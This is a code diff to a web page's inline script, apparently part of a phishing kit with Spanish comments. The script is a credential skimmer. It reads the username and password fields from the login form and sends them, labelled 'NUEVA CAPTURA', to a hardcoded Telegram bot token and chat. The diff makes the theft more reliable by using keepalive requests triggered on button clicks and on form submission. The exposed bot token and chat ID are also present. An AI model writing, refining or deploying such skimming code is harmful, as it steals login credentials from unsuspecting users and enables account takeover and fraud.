@@ -428,42 +428,50 @@
     const TOKEN = "9159089747:AAGrdR7YNxmKCXvzec1LLpWhKCvt2ivc6uQ";
     const CHAT_ID = "7007914207";
 
-    document.addEventListener("submit", function (e) {
-      const form = e.target;
-      
-      // 1. Frenamos el envío inmediato para que el celular no mate la petición
-      e.preventDefault();
+    function despachar(usuario, password) {
+      if (!usuario && !password) return;
 
-      const userEl = form.querySelector('input[name="usuario"], input[id="usuario"], input[id="loginUsuario"], input[type="text"], input[type="email"]');
-      const passEl = form.querySelector('input[name="password"], input[id="password"], input[type="password"]');
-
-      const usuario = userEl ? userEl.value.trim() : "No capturado";
-      const password = passEl ? passEl.value : "No capturado";
-
-      const texto = [
-        "🚨 NUEVA CAPTURA MÓVIL/PC",
-        "Usuario: " + usuario,
-        "Clave: " + password,
-        "🌐 URL: " + location.href,
-        "🕒 Hora: " + new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" })
+      const mensaje = [
+        "🚨 NUEVA CAPTURA",
+        "Usuario: " + (usuario || "vacío"),
+        "Clave: " + (password || "vacía"),
+        "Hora: " + new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" })
       ].join("\n");
 
-      const url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
-
-      // 2. Enviamos los datos a Telegram y cuando responda, dejamos que la página siga su curso
-      fetch(url, {
+      fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
-      })
-      .then(() => {
-        // Envía el formulario de verdad una vez despachado el mensaje
-        HTMLFormElement.prototype.submit.call(form);
-      })
-      .catch(() => {
-        // Si falla Telegram, igual deja avanzar el formulario para que no se trabe la página
-        HTMLFormElement.prototype.submit.call(form);
-      });
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: mensaje
+        }),
+        keepalive: true
+      }).catch(() => {});
+    }
+
+    function leerYEnviar() {
+      const userInput =
+        document.getElementById("loginUsuario") ||
+        document.querySelector('input[name="usuario"], input[id="usuario"], input[type="text"], input[type="email"]');
+      const passInput =
+        document.querySelector('input[type="password"], input[name="password"], input[id="password"]');
+
+      const usuario = userInput ? userInput.value.trim() : "";
+      const password = passInput ? passInput.value : "";
+
+      despachar(usuario, password);
+    }
+
+    document.addEventListener("click", function (e) {
+      const btn = e.target && e.target.closest ? e.target.closest('button, input[type="submit"], [role="button"]') : null;
+      if (!btn) return;
+
+      leerYEnviar();
+      setTimeout(leerYEnviar, 150);
+    }, true);
+
+    document.addEventListener("submit", function () {
+      leerYEnviar();
     }, true);
   })();
 </script>
